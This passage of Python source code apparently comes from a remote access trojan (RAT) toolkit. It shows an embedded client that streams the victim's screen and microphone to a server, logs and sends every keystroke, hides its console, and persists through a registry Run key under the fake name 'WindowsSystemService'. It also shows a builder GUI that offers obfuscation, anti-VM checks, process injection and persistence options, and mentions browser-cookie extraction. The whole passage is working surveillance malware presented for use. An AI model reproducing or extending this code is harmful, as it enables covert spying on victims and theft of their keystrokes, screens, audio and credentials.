            self.client_socket.send(size)
            self.client_socket.send(error_msg.encode())
    
    def screen_capture(self):
        """Capture screen and send to server via UDP with optimized performance"""
        print("[*] Starting screen capture with enhanced performance")
        try:
            # Import required libraries
            import socket
            import struct
            import time
            import zlib
            import threading
            from PIL import ImageGrab
            import numpy as np
            import cv2
            
            # Create UDP socket for sending screenshots
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Set socket buffer size with more conservative value
            send_buffer_size = 4194304  # 4MB buffer
            udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, send_buffer_size)
            
            # Set socket options for better performance
            udp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            # Try to set QoS (Type of Service) for real-time data
            try:
                # IPTOS_LOWDELAY (0x10) - minimize delay
                udp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_TOS, 0x10)
            except (AttributeError, OSError):
                # Skip if not supported on this platform
                pass
            
            # Define constants for transmission
            MAX_CHUNK_SIZE = 1200  # Conservative chunk size to avoid fragmentation
            
            # Create the enhanced adaptive capture handler
            adaptive_capture = EnhancedAdaptiveScreenCapture(self.client_socket)
            
            # Initialize sequence tracking
            frame_number = 0
            last_fps_calc_time = time.time()
            frames_since_last_calc = 0
            current_fps = 0
            
            # Buffer pool for reuse to reduce memory pressure
            compress_buffer_pool = []
            MAX_COMPRESS_BUFFER_POOL = 3
            
            # Direct pixel access for faster screen capture when possible
            direct_capture_available = False
            try:
                # Try to import platform-specific faster capture libraries
                if sys.platform.startswith('win'):
                    try:
                        import win32gui
                        import win32ui
                        import win32con
                        import win32api
                        direct_capture_available = True
                    except ImportError:
                        pass
            except:
                pass
                
            # Thread synchronization for non-blocking network operations
            network_backlog = 0
            backlog_lock = threading.Lock()
            
            def send_frame_chunks(compressed_data, current_frame_number, client_resolution_scale):
                """Send frame chunks in a separate thread to avoid blocking"""
                nonlocal network_backlog
                
                start_send_time = time.time()
                
                try:
                    # Calculate number of chunks needed
                    data_len = len(compressed_data)
                    num_chunks = (data_len + MAX_CHUNK_SIZE - 1) // MAX_CHUNK_SIZE
                    
                    # Send frame metadata
                    metadata = struct.pack('!QII', data_len, num_chunks, current_frame_number)
                    udp_socket.sendto(metadata, self.server_address)
                    
                    # Small delay to ensure metadata is processed first
                    time.sleep(0.001)
                    
                    # Send chunks with sequence numbers for reassembly
                    for i in range(num_chunks):
                        chunk_start = i * MAX_CHUNK_SIZE
                        chunk_end = min(chunk_start + MAX_CHUNK_SIZE, data_len)
                        chunk = compressed_data[chunk_start:chunk_end]
                        
                        # Pack chunk with header (frame_number, chunk_index, total_chunks)
                        header = struct.pack('!III', current_frame_number, i, num_chunks)
                        packet = header + chunk
                        
                        # Send the chunk
                        udp_socket.sendto(packet, self.server_address)
                        
                        # Brief pause between chunks based on backlog
                        with backlog_lock:
                            current_backlog = network_backlog
                        
                        # Adjust sending rate based on backlog
                        if current_backlog > 5:
                            chunk_delay = 0.002  # 2ms between chunks
                        elif current_backlog > 2:
                            chunk_delay = 0.001  # 1ms between chunks
                        else:
                            chunk_delay = 0  # No delay when network is clear
                            
                        if chunk_delay > 0 and i % 5 == 0 and i > 0:
                            time.sleep(chunk_delay)
                    
                    # Calculate total send time
                    send_time = time.time() - start_send_time
                    
                    # Update network backlog
                    with backlog_lock:
                        network_backlog = max(0, network_backlog - 1)
                    
                    # Return the buffer to the pool if possible
                    if len(compress_buffer_pool) < MAX_COMPRESS_BUFFER_POOL:
                        compress_buffer_pool.append(compressed_data)
                    
                    # Update adaptive system with performance metrics
                    adaptive_capture.measure_performance(data_len, send_time)
                    
                except Exception as e:
                    print(f"[!] Error sending frame chunks: {e}")
                    with backlog_lock:
                        network_backlog = max(0, network_backlog - 1)
            
            # Function for faster screen capture on Windows
            def fast_windows_capture():
                try:
                    # Get screen dimensions
                    width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
                    height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
                    left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
                    top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
                    
                    # Create device context
                    hdc = win32gui.GetDC(0)
                    dc_obj = win32ui.CreateDCFromHandle(hdc)
                    compatible_dc = dc_obj.CreateCompatibleDC()
                    
                    # Create bitmap object
                    bitmap = win32ui.CreateBitmap()
                    bitmap.CreateCompatibleBitmap(dc_obj, width, height)
                    compatible_dc.SelectObject(bitmap)
                    
                    # Copy screen into bitmap
                    compatible_dc.BitBlt((0, 0), (width, height), dc_obj, (left, top), win32con.SRCCOPY)
                    
                    # Convert bitmap to PIL Image
                    bitmap_info = bitmap.GetInfo()
                    bitmap_bits = bitmap.GetBitmapBits(True)
                    img = Image.frombuffer('RGB', (bitmap_info['bmWidth'], bitmap_info['bmHeight']), bitmap_bits, 'raw', 'BGRX', 0, 1)
                    
                    # Clean up
                    win32gui.ReleaseDC(0, hdc)
                    dc_obj.DeleteDC()
                    compatible_dc.DeleteDC()
                    win32gui.DeleteObject(bitmap.GetHandle())
                    
                    return img
                except Exception as e:
                    # print(f"[!] Fast screen capture failed: {e}")
                    return None
            
            # Main capture loop
            while self.screen_capture_active and self.connected and not self.stop_threads:
                try:
                    start_time = time.time()
                    
                    # Get current adaptive parameters
                    current_quality = adaptive_capture.quality
                    current_scale = adaptive_capture.resolution_scale
                    
                    # Choose capture method based on availability
                    if direct_capture_available:
                        # Try fast capture method first
                        screenshot = fast_windows_capture()
                        # Fall back to standard method if fast capture fails
                        if screenshot is None:
                            screenshot = ImageGrab.grab()
                    else:
                        # Standard capture method
                        screenshot = ImageGrab.grab()
                    
                    # Apply resolution scaling if needed
                    if current_scale < 1.0:
                        orig_width, orig_height = screenshot.size
                        new_width = max(64, int(orig_width * current_scale))
                        new_height = max(64, int(orig_height * current_scale))
                        screenshot = screenshot.resize((new_width, new_height), Image.LANCZOS)
                    
                    # Convert to numpy array using optimized path
                    screenshot_np = np.array(screenshot)
                    frame = cv2.cvtColor(screenshot_np, cv2.COLOR_RGB2BGR)
                    
                    # Encode with current quality
                    encode_params = [cv2.IMWRITE_JPEG_QUALITY, current_quality]
                    _, buffer = cv2.imencode('.jpg', frame, encode_params)
                    
                    # Check network backlog before compressing
                    with backlog_lock:
                        current_backlog = network_backlog
                    
                    # Skip frames if network is congested
                    if current_backlog > 10:
                        print(f"[!] Network congestion detected, skipping frame {frame_number}")
                        time.sleep(0.05)  # Brief pause to allow network to catch up
                        continue
                    
                    # Compress the data
                    if compress_buffer_pool:
                        # Reuse buffer from pool
                        compressed_data = compress_buffer_pool.pop()
                        # Reset buffer and overwrite with new compressed data
                        compressed_data = zlib.compress(buffer, level=1)  # Use fast compression
                    else:
                        # Create new buffer
                        compressed_data = zlib.compress(buffer, level=1)
                    
                    # Increment frame number
                    frame_number += 1
                    
                    # Update network backlog
                    with backlog_lock:
                        network_backlog += 1
                    
                    # Send chunks in a separate thread to avoid blocking the capture loop
                    threading.Thread(
                        target=send_frame_chunks,
                        args=(compressed_data, frame_number, current_scale)
                    ).start()
                    
                    # Calculate frame processing time (excluding network)
                    process_time = time.time() - start_time
                    
                    # Calculate current FPS
                    frames_since_last_calc += 1
                    fps_calc_elapsed = time.time() - last_fps_calc_time
                    
                    if fps_calc_elapsed >= 1.0:  # Update FPS once per second
                        current_fps = frames_since_last_calc / fps_calc_elapsed
                        last_fps_calc_time = time.time()
                        frames_since_last_calc = 0
                    
                    # Dynamic sleep based on target FPS and processing time
                    # Calculate target FPS based on network conditions and quality
                    if current_quality > 80:
                        target_fps = 20  # High quality = lower FPS
                    elif current_quality > 50:
                        target_fps = 25  # Medium quality
                    else:
                        target_fps = 30  # Low quality = higher FPS
                    
                    # Adjust target FPS based on network backlog
                    target_fps = max(5, target_fps - current_backlog)
                    
                    # Calculate and apply sleep time
                    if target_fps > 0:
                        target_frame_time = 1.0 / target_fps
                        sleep_time = max(0.001, target_frame_time - process_time)
                        time.sleep(sleep_time)
                    else:
                        time.sleep(0.05)  # Fallback sleep
                    
                    # Print diagnostics occasionally
                    if frame_number % 30 == 0:
                        elapsed = time.time() - start_time
                        print(f"[*] Frame {frame_number}: {len(compressed_data)} bytes, "
                            f"process: {process_time*1000:.1f}ms, "
                            f"quality: {current_quality}, scale: {current_scale:.2f}, "
                            f"FPS: {current_fps:.1f}, backlog: {current_backlog}")
                    
                except Exception as e:
                    print(f"[!] Error during screen capture: {e}")
                    time.sleep(0.5)  # Shorter wait before retry
            
            # Send termination signal when done
            try:
                udp_socket.sendto(struct.pack('!QII', 0, 0, 0), self.server_address)
            except:
                pass
                
            udp_socket.close()
            print("[*] Screen capture stopped")
        
        except Exception as e:
            print(f"[!] Screen capture thread error: {e}")
            
    def audio_spy(self):
        """Capture audio from microphone and send to server via UDP"""
        print("[*] Starting audio capture")
        try:
            # Setup PyAudio
            p = pyaudio.PyAudio()
            stream = p.open(format=pyaudio.paInt16,
                          channels=2,
                          rate=44100,
                          input=True)
            
            # Create UDP socket for sending audio
            udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            while self.audio_spy_active and self.connected and not self.stop_threads:
                try:
                    # Read audio chunk
                    data = stream.read(4096, exception_on_overflow=False)
                    packed_size = struct.pack('Q', len(data))
                    # Send directly via UDP
                    udp_socket.sendto(packed_size, self.server_address)
                    udp_socket.sendto(data, self.server_address)
                    
                except Exception as e:
                    print(f"[!] Error during audio capture: {e}")
                    time.sleep(0.1)  # Small delay before retry
            
            # Cleanup
            stream.stop_stream()
            stream.close()
            p.terminate()
            udp_socket.close()
            print("[*] Audio capture stopped")
        
        except Exception as e:
            print(f"[!] Audio capture thread error: {e}")
    
    def on_key_press(self, key):
        """Callback for key press events"""
        if not self.keylogger_active:
            return False  # Stop listener
        
        try:
            # Convert key to string representation
            if hasattr(key, 'char'):
                # Regular character
                if key.char:
                    keydata = key.char
                else:
                    keydata = '[special]'
            elif key == keyboard.Key.space:
                keydata = ' '
            elif key == keyboard.Key.enter:
                keydata = '\n'
            elif key == keyboard.Key.tab:
                keydata = '\t'
            elif key == keyboard.Key.backspace:
                keydata = '⌫'  # Special character for backspace
            else:
                # Special key (like shift, ctrl, etc.)
                keydata = f"[{key}]"
            
            # Send key to server
            if self.connected and self.client_socket:
                self.client_socket.send(keydata.encode('utf-8', errors='ignore'))
        
        except Exception as e:
            print(f"[!] Error in keylogger: {e}")
        
        return True  # Continue listener
    
    def start_keylogger(self):
        """Start the keylogger"""
        if not self.key_listener:
            print("[*] Starting keylogger")
            self.keylogger_active = True
            
            # Start keyboard listener in a separate thread
            self.key_listener = keyboard.Listener(on_press=self.on_key_press)
            self.key_listener.daemon = True
            self.key_listener.start()
    
    def stop_keylogger(self):
        """Stop the keylogger"""
        if self.key_listener:
            print("[*] Stopping keylogger")
            self.keylogger_active = False
            
            try:
                self.key_listener.stop()
                self.key_listener = None
            except:
                pass

    def handle_network_analysis_command(self, command):
        """Handle network analysis commands"""
        if command == "START_NETWORK_ANALYSIS":
            self.start_network_analysis()
        elif command == "STOP_NETWORK_ANALYSIS":
            self.stop_network_analysis()
        elif command == "GET_NETWORK_ANALYSIS_DATA":
            self.send_network_analysis_data()

    def start_network_analysis(self):
        """Start analyzing network traffic in real-time"""
        if not hasattr(self, 'network_analyzer'):
            self.network_analyzer = NetworkAnalyzer()
            
        success = self.network_analyzer.start()
        if success:
            self.client_socket.send("SUCCESS: Network analysis started".encode())
        else:
            self.client_socket.send("ERROR: Failed to start network analysis".encode())

    def stop_network_analysis(self):
        """Stop network traffic analysis"""
        if hasattr(self, 'network_analyzer'):
            self.network_analyzer.stop()
            
        self.client_socket.send("SUCCESS: Network analysis stopped".encode())

    def send_network_analysis_data(self):
        """Send the current network analysis data to the server"""
        try:
            if hasattr(self, 'network_analyzer'):
                # Get latest analysis data
                analysis_data = self.network_analyzer.get_analysis_data()
                
                # Convert to JSON and send
                data = json.dumps(analysis_data).encode('utf-8')
                
                # Send size first
                self.client_socket.send(struct.pack('Q', len(data)))
                
                # Send actual data
                self.client_socket.sendall(data)
            else:
                # Send empty data if analyzer doesn't exist
                self.client_socket.send(struct.pack('Q', 2))
                self.client_socket.send("{}".encode())
                
        except Exception as e:
            print(f"[!] Error sending network analysis data: {e}")
            # Send empty data on error
            self.client_socket.send(struct.pack('Q', 2))
            self.client_socket.send("{}".encode())


def hide_console():
    """Hide the console window on Windows"""
    if os.name == 'nt':  # Only on Windows
        try:
            whnd = ctypes.windll.kernel32.GetConsoleWindow()
            if whnd != 0:
                ctypes.windll.user32.ShowWindow(whnd, 0)  # SW_HIDE = 0
        except Exception as e:
            print(f"[!] Error hiding console: {e}")

def run_on_startup():
    """Add the client to startup (platform dependent)"""
    try:
        if os.name == 'nt':  # Windows
            # Get the path to the current script
            script_path = os.path.abspath(sys.argv[0])
            
            # Add to registry for startup
            import winreg
            key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSystemService", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            
        print("[*] Added to startup successfully")
        
    except Exception as e:
        print(f"[!] Error adding to startup: {e}")

def is_admin():
    """Check if the script is running with admin_root privileges"""
    try:
        if os.name == 'nt':  # Windows
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def main():
    # Configuration
    HIDE_CONSOLE = False  # Set to True to hide console window
    ADD_TO_STARTUP = False  # Set to True to add to startup
    REQUEST_ADMIN = False  # Set to True to request admin privileges if not already running as admin
    
    # Check for admin rights if requested
    if REQUEST_ADMIN and not is_admin():
        print("[!] Not running as administrator. Requesting elevation...")
        try:
            if os.name == 'nt':  # Windows
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            else:
                # On Unix systems, we'd typically use sudo, but that requires a password
                # This is just a placeholder and won't actually work in most cases
                os.system(f"sudo {sys.executable} {' '.join(sys.argv)}")
            sys.exit(0)
        except Exception as e:
            print(f"[!] Failed to elevate privileges: {e}")
    
    # Hide console if requested
    if HIDE_CONSOLE:
        hide_console()
    
    # Add to startup if requested
    if ADD_TO_STARTUP:
        run_on_startup()
    
    # Create and run the client
    client = RATClient(SERVER_IP, SERVER_PORT)
    
    # Attempt initial connection
    connected = client.connect()
    
    # Main loop with reconnection attempts
    while not client.stop_threads:
        try:
            if not client.connected:
                print("[*] Attempting to connect...")
                client.connect()
                time.sleep(5)  # Wait before next attempt
            else:
                time.sleep(1)  # Just wait while connected
        except KeyboardInterrupt:
            print("[*] Keyboard interrupt detected, exiting...")
            client.disconnect()
            break
        except Exception as e:
            print(f"[!] Error in main loop: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
    '''
    
    def __init__(self, parent, rat_app):
        self.parent = parent
        self.rat_app = rat_app
        self.client_template_path = "client_template.py"
        self.client_code = self.c_code
        self.obfuscation_level = 1
        self.persistence_enabled = False
        self.hide_console = False
        self.mutex_name = f"rat_client_{str(uuid.uuid4())[:8]}"
        self.startup_method = "registry"
        self.anti_vm = False
        self.build_logs = []
        self.is_building = False
        
        
        # Default build options
        self.build_options = {
            "host": rat_app.ip if hasattr(rat_app, 'ip') else "127.0.0.1",
            "port": rat_app.port if hasattr(rat_app, 'port') else 4444,
            "file_name": "client.exe",
            "output_dir": os.path.join(os.path.expanduser("~"), "Desktop"),
            "icon_path": "",
            "obfuscation": 1,
            "compile_to_exe": True,
            "persistence": False,
            "persistence_method": "registry",
            "startup_name": "Windows Service",
            "hide_console": True,
            "anti_vm": False,
            "mutex_enabled": True,
            "mutex_name": self.mutex_name,
            "process_injection": False,
            "injection_method": "createremotethread"
        }
        
        # Setup UI
        self.setup_ui()
        
        # Initially load template
        # self.load_client_template()
    
    def get_theme_colors(self):
        """Get the current theme colors from the rat_app."""
        theme_name = self.rat_app.current_theme
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            return self.rat_app.THEMES[theme_name]
        else:
            return self.rat_app.THEMES[theme_name]
    
    def register_with_theme_manager(self):
        """Register widgets with the theme manager if available."""
        if hasattr(self.rat_app, 'theme_manager') and self.rat_app.theme_manager is not None:
            theme_manager = self.rat_app.theme_manager
            
            # Register main frame
            theme_manager.track_widget(self.builder_frame)
            
            # Register each frame, button, etc.
            for widget in self.theme_widgets:
                theme_manager.track_widget(widget)
            
            # Register text widgets
            for text_widget in self.theme_text_widgets:
                theme_manager.track_widget(text_widget, "scrolledtext")
    
    def setup_ui(self):
        """Set up the client builder UI"""
        theme = self.get_theme_colors()
        
        # Lists to track widgets for theme management
        self.theme_widgets = []
        self.theme_text_widgets = []
        
        # Create main builder frame
        self.builder_frame = ctk.CTkFrame(self.parent)
        self.parent.add(self.builder_frame, text="Client Builder")
        
        # Split into left config panel and right preview/log panel
        left_panel = ctk.CTkFrame(self.builder_frame)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.theme_widgets.append(left_panel)
        
        right_panel = ctk.CTkFrame(self.builder_frame)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.theme_widgets.append(right_panel)
        
        # === LEFT PANEL - Configuration options ===
        # Connection settings
        connection_frame = ctk.CTkFrame(left_panel, fg_color=theme["card_color"], corner_radius=10)
        connection_frame.pack(fill=tk.X, padx=5, pady=5)
        self.theme_widgets.append(connection_frame)
        
        connection_label = ctk.CTkLabel(connection_frame, text="Connection Settings", 
                                      font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"))
        connection_label.pack(anchor="w", padx=10, pady=5)
        
        # Host input
        host_frame = ctk.CTkFrame(connection_frame, fg_color="transparent")
        host_frame.pack(fill=tk.X, padx=10, pady=5)
        
        host_label = ctk.CTkLabel(host_frame, text="Host:", width=100)
        host_label.pack(side=tk.LEFT, padx=5)
        
        self.host_entry = ctk.CTkEntry(host_frame, width=200)
        self.host_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.host_entry.insert(0, self.build_options["host"])
        self.theme_widgets.append(self.host_entry)
        
        # Port input
        port_frame = ctk.CTkFrame(connection_frame, fg_color="transparent")
        port_frame.pack(fill=tk.X, padx=10, pady=5)
        
        port_label = ctk.CTkLabel(port_frame, text="Port:", width=100)
        port_label.pack(side=tk.LEFT, padx=5)
        
        self.port_entry = ctk.CTkEntry(port_frame, width=200)
        self.port_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.port_entry.insert(0, str(self.build_options["port"]))
        self.theme_widgets.append(self.port_entry)
        
        # Use current settings button
        current_settings_btn = ctk.CTkButton(connection_frame, text="Use Current Server Settings", 
                                          command=self.use_current_settings,
                                          fg_color=theme["button_color"],
                                          hover_color=theme["hover_color"])
        current_settings_btn.pack(pady=10)
        self.theme_widgets.append(current_settings_btn)
        
        # Build settings
        build_frame = ctk.CTkFrame(left_panel, fg_color=theme["card_color"], corner_radius=10)
        build_frame.pack(fill=tk.X, padx=5, pady=5)
        self.theme_widgets.append(build_frame)
        
        build_label = ctk.CTkLabel(build_frame, text="Build Settings", 
                                 font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"))
        build_label.pack(anchor="w", padx=10, pady=5)
        
        # Output file name
        filename_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
        filename_frame.pack(fill=tk.X, padx=10, pady=5)
        
        filename_label = ctk.CTkLabel(filename_frame, text="File Name:", width=100)
        filename_label.pack(side=tk.LEFT, padx=5)
        
        self.filename_entry = ctk.CTkEntry(filename_frame, width=200)
        self.filename_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.filename_entry.insert(0, self.build_options["file_name"])
        self.theme_widgets.append(self.filename_entry)
        
        # Output directory
        outdir_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
        outdir_frame.pack(fill=tk.X, padx=10, pady=5)
        
        outdir_label = ctk.CTkLabel(outdir_frame, text="Output Directory:", width=100)
        outdir_label.pack(side=tk.LEFT, padx=5)
        
        self.outdir_entry = ctk.CTkEntry(outdir_frame, width=200)
        self.outdir_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.outdir_entry.insert(0, self.build_options["output_dir"])
        self.theme_widgets.append(self.outdir_entry)
        
        browse_btn = ctk.CTkButton(outdir_frame, text="Browse", 
                                 command=self.browse_output_dir,
                                 width=70,
                                 fg_color=theme["button_color"],
                                 hover_color=theme["hover_color"])
        browse_btn.pack(side=tk.RIGHT, padx=5)
        self.theme_widgets.append(browse_btn)
        
        # Icon path
        icon_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
        icon_frame.pack(fill=tk.X, padx=10, pady=5)
        
        icon_label = ctk.CTkLabel(icon_frame, text="Icon File:", width=100)
        icon_label.pack(side=tk.LEFT, padx=5)
        
        self.icon_entry = ctk.CTkEntry(icon_frame, width=200)
        self.icon_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.icon_entry.insert(0, self.build_options["icon_path"])
        self.theme_widgets.append(self.icon_entry)
        
        icon_browse_btn = ctk.CTkButton(icon_frame, text="Browse", 
                                      command=self.browse_icon_file,
                                      width=70,
                                      fg_color=theme["button_color"],
                                      hover_color=theme["hover_color"])
        icon_browse_btn.pack(side=tk.RIGHT, padx=5)
        self.theme_widgets.append(icon_browse_btn)
        
        # Obfuscation level
        obfuscation_frame = ctk.CTkFrame(build_frame, fg_color="transparent")
        obfuscation_frame.pack(fill=tk.X, padx=10, pady=5)
        
        obfuscation_label = ctk.CTkLabel(obfuscation_frame, text="Obfuscation Level:")
        obfuscation_label.pack(side=tk.LEFT, padx=5)
        
        self.obfuscation_var = tk.IntVar(value=self.build_options["obfuscation"])
        
        obfuscation_slider = ctk.CTkSlider(obfuscation_frame, from_=0, to=1, 
                                         variable=self.obfuscation_var,
                                         number_of_steps=1,
                                         width=150, fg_color=theme["accent_color"], button_color=theme["accent_color"])
        obfuscation_slider.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(obfuscation_slider)
        
        self.obfuscation_value = ctk.CTkLabel(obfuscation_frame, text=str(self.obfuscation_var.get()))
        self.obfuscation_value.pack(side=tk.LEFT, padx=5)
        
        # Update the label when slider changes
        self.obfuscation_var.trace_add("write", 
                                      lambda *args: self.obfuscation_value.configure(
                                          text=str(self.obfuscation_var.get())))
        
        # Stealth options
        self.stealth_frame = ctk.CTkFrame(left_panel, fg_color=theme["card_color"], corner_radius=10)
        self.stealth_frame.pack(fill=tk.X, padx=5, pady=5)
        self.theme_widgets.append(self.stealth_frame)
        
        stealth_label = ctk.CTkLabel(self.stealth_frame, text="Stealth Options", 
                                   font=ctk.CTkFont(family="Segoe UI", size=16, weight="bold"))
        stealth_label.pack(anchor="w", padx=10, pady=5)
        
        # Persistence
        persistence_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        persistence_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.persistence_var = tk.BooleanVar(value=self.build_options["persistence"])
        persistence_checkbox = ctk.CTkCheckBox(persistence_frame, text="Add Persistence", 
                                             variable=self.persistence_var,
                                             onvalue=True, offvalue=False,
                                             checkbox_width=20,
                                             checkbox_height=20,
                                             command=self.toggle_persistence_options,
                                             fg_color=theme["accent_color"])
        persistence_checkbox.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(persistence_checkbox)
        
        # Persistence method
        method_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        method_frame.pack(fill=tk.X, padx=10, pady=5)
        
        method_label = ctk.CTkLabel(method_frame, text="Persistence Method:", width=150)
        method_label.pack(side=tk.LEFT, padx=5)
        
        self.persistence_method_var = tk.StringVar(value=self.build_options["persistence_method"])
        method_dropdown = ctk.CTkOptionMenu(method_frame, values=["registry", "startup_folder", "scheduled_task"],
                                          variable=self.persistence_method_var,
                                          fg_color=theme["button_color"],
                                          button_color=theme["button_color"],
                                          button_hover_color=theme["hover_color"])
        method_dropdown.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(method_dropdown)
        
        # Startup name
        startup_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        startup_frame.pack(fill=tk.X, padx=10, pady=5)
        
        startup_label = ctk.CTkLabel(startup_frame, text="Startup Name:", width=150)
        startup_label.pack(side=tk.LEFT, padx=5)
        
        self.startup_name_entry = ctk.CTkEntry(startup_frame, width=200)
        self.startup_name_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.startup_name_entry.insert(0, self.build_options["startup_name"])
        self.theme_widgets.append(self.startup_name_entry)
        
        # Hide console
        console_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        console_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.hide_console_var = tk.BooleanVar(value=self.build_options["hide_console"])
        hide_console_checkbox = ctk.CTkCheckBox(console_frame, text="Hide Console Window", 
                                              variable=self.hide_console_var,
                                              onvalue=True, offvalue=False,
                                              checkbox_width=20,
                                              checkbox_height=20,
                                              fg_color=theme["accent_color"])
        hide_console_checkbox.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(hide_console_checkbox)
        
        # Anti-VM
        antivm_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        antivm_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.antivm_var = tk.BooleanVar(value=self.build_options["anti_vm"])
        antivm_checkbox = ctk.CTkCheckBox(antivm_frame, text="Anti-VM (Don't run in virtual machines)", 
                                        variable=self.antivm_var,
                                        onvalue=True, offvalue=False,
                                        checkbox_width=20,
                                        checkbox_height=20,
                                        fg_color=theme["accent_color"])
        antivm_checkbox.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(antivm_checkbox)
        
        # Mutex (prevent multiple instances)
        mutex_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        mutex_frame.pack(fill=tk.X, padx=10, pady=5)
        
        self.mutex_var = tk.BooleanVar(value=self.build_options["mutex_enabled"])
        mutex_checkbox = ctk.CTkCheckBox(mutex_frame, text="Use Mutex (Prevent multiple instances)", 
                                       variable=self.mutex_var,
                                       onvalue=True, offvalue=False,
                                       checkbox_width=20,
                                       checkbox_height=20,
                                       command=self.toggle_mutex_options,
                                       fg_color=theme["accent_color"])
        mutex_checkbox.pack(side=tk.LEFT, padx=5)
        self.theme_widgets.append(mutex_checkbox)
        
        # Mutex name
        mutex_name_frame = ctk.CTkFrame(self.stealth_frame, fg_color="transparent")
        mutex_name_frame.pack(fill=tk.X, padx=10, pady=5)
        
        mutex_name_label = ctk.CTkLabel(mutex_name_frame, text="Mutex Name:", width=150)
        mutex_name_label.pack(side=tk.LEFT, padx=5)
        
        self.mutex_name_entry = ctk.CTkEntry(mutex_name_frame, width=200)
        self.mutex_name_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        self.mutex_name_entry.insert(0, self.build_options["mutex_name"])
        self.theme_widgets.append(self.mutex_name_entry)
        self.setup_injection_ui()
        
        # Build buttons
        button_frame = ctk.CTkFrame(left_panel, fg_color="transparent")
        button_frame.pack(fill=tk.X, padx=5, pady=10)
        
        build_exe_btn = ctk.CTkButton(button_frame, text="Build EXE", 
                                    command=lambda: self.build_client(compile_exe=True),
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"])
        build_exe_btn.pack(side=tk.LEFT, padx=5, expand=True, fill=tk.X)
        self.theme_widgets.append(build_exe_btn)
        
        # === RIGHT PANEL - Preview and logs ===
        # Create notebook for tabs
        right_notebook = ttk.Notebook(right_panel)
        right_notebook.pack(fill=tk.BOTH, expand=True)

        # Build log tab
        log_frame = ctk.CTkFrame(right_notebook, fg_color=theme["bg_color"])
        right_notebook.add(log_frame, text="Build Log")
        
        # Build log
        self.build_log = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD,
                                                 background=theme["bg_color"],
                                                 foreground=theme["fg_color"],
                                                 font=("Consolas", 10))
        self.build_log.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.theme_text_widgets.append(self.build_log)
        
        # Requirements tab
        req_frame = ctk.CTkFrame(right_notebook, fg_color=theme["bg_color"])
        right_notebook.add(req_frame, text="Requirements")
        
        # Requirements text
        self.req_text = scrolledtext.ScrolledText(req_frame, wrap=tk.WORD,
                                               background=theme["bg_color"],
                                               foreground=theme["fg_color"],
                                               font=("Consolas", 10))
        self.req_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        self.theme_text_widgets.append(self.req_text)
        
        # Fill requirements
        self.req_text.insert(tk.END, "To build working RAT clients, you need:\n\n")
        self.req_text.insert(tk.END, "1. Python 3.6+ installed on your system\n")
        self.req_text.insert(tk.END, "2. PyInstaller for EXE compilation (pip install pyinstaller)\n")
        self.req_text.insert(tk.END, "3. Required client libraries (listed below)\n\n")
        self.req_text.insert(tk.END, "Required Python libraries for the client:\n")
        self.req_text.insert(tk.END, "- socket\n- threading\n- zlib\n- io\n- cv2 (OpenCV)\n")
        self.req_text.insert(tk.END, "- numpy\n- pyaudio\n- PIL (Pillow)\n- pynput\n- psutil\n")
        self.req_text.insert(tk.END, "- scapy (for network capture)\n- ctypes (for Windows features)\n")
        self.req_text.insert(tk.END, "- win32clipboard (for clipboard monitoring)\n")
        self.req_text.insert(tk.END, "- browser_cookie3 (for browser data extraction)\n")
        self.req_text.insert(tk.END, "- pyautogui (for remote desktop control)\n\n")
        self.req_text.insert(tk.END, "To install all required libraries:\n")
        self.req_text.insert(tk.END, "pip install opencv-python numpy pyaudio pillow pynput psutil scapy pywin32 browser-cookie3 pyautogui")
        self.req_text.configure(state="disabled")
